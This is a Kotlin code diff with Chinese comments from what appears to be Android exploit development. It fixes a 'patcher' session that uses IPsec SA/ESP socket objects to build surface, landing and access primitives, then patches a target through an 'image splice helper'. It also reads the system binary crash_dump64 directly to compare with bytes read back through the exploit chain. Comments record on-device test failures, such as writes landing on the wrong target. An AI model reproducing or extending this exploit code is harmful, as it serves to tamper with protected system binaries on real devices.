@@ -601,13 +601,32 @@ object TypedBackendProbe {
         /* patch#1 的实例用**SA 的材料**（落地对象在 resolve 那一刻就把它焊死，写调用处换材料没用 —— 2026-10-15 读代码确认）。 */
         val patcher = Assembled43284(Native43284.create()) { saInit() }
         val patchDoor = patcher.openTargetStepwise(patchTarget)
+
+        /* patch#1 必须走**自己的**分步链：此前它只建了 target，landing 一直是 0 ✗，
+         * 于是 Access 落在**载体**的 landing 上 —— 读零、写错目标、verify 必败（2026-10-15 真机证据）。 */
+        /* 一条 SA 只有一条 ESP 套接字（setIpv4Encapsulation 只声明一个 sender 端口）：复用第一条。 */
+        patcher.reuseSocketFrom(stepwise)
+        step("typed: patcher reuses socket=" + stepwise.socketId)
+        val madeSurface = patcher.buildSurface()
+        step("typed: patcher surfaceId=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
+        val madeLanding = patcher.buildLanding()
+        step("typed: patcher landingId=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
+        step("typed: marker-before-ids")
         step("typed: patch1 door=" + patchDoor + " refusal=" + patcher.lastRefusal)
-        patcher.openEspSocket()
-        step("typed: patch1 surface=" + patcher.buildSurface())
-        step("typed: patch1 landing=" + patcher.buildLanding())
         step("typed: patch1 access=" + patcher.buildAccess())
         val patchParams = Assembled43284.fullAccessParams(patchTarget)
-        step("typed: patch1 init=" + patcher.initializeAccessAndRemember(patchParams, init43284()) +
+
+        /* 两个会话的 id 对照：若 patch#1 的 access 挂在 stepwise 的 landing 上，就是这里串了。 */
+        runCatching {
+            step(
+                "typed: ids stepwise target=" + stepwise.targetId + " landing=" + stepwise.landingId +
+                    " access=" + stepwise.accessId + " || patcher target=" + patcher.targetId +
+                    " landing=" + patcher.landingId + " access=" + patcher.accessId,
+            )
+        }.onFailure { problem ->
+            step("typed: ids refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+        }
+        step("typed: patch1 init=" + patcher.initializeAccessAndRemember(patchParams, saInit()) +
             " refusal=" + patcher.lastRefusal)
         val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
         /* 自证：打印**即将用于 write 的那一份**材料（DTO 读后清零的规律要求它每次现造，这里验证它到调用点时还是非零的）。 */
@@ -623,7 +642,7 @@ object TypedBackendProbe {
          * Kotlin 直读 crash_dump64 前 16 字节（我们对它可读 ✓），与经链子读回的对比。 */
         runCatching {
             val direct = java.io.File("/apex/com.android.runtime/bin/crash_dump64").inputStream().use { stream ->
-                val buffer = ByteArray(16)
+                val buffer = ByteArray(48)
                 val count = stream.read(buffer)
                 if (count > 0) buffer.copyOf(count) else ByteArray(0)
             }
